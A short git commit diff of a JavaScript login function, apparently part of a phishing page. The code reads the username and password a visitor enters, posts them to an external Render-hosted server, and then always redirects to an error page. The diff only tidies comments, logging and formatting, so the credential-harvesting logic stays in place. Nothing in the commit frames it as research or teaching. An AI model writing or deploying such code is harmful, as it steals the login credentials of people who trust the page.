5f5ad48cd98a38a1127986a8501c67903b2d0aea
sahil <sahilch0407@gmail.com>
2025-03-22 09:13:11 +0530

    update

--- index.js
+++ index.js
@@ -1,19 +1,15 @@
-
 function login() {
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
 
-    fetch("https://dashboard.render.com/web/srv-cvf2lmbqf0us73fl3h40", {  // Replace YOUR_LAPTOP_IP with your actual IP
+    fetch("https://dashboard.render.com/web/srv-cvf2lmbqf0us73fl3h40", {
         method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ username, password })
     })
     .then(response => response.json())
     .then(data => {
-        console.log(data);
-        window.location.href = "error.html"; // Redirect to error page
+        window.location.href = "error.html";
     })
     .catch(error => console.error("Error:", error));
 }
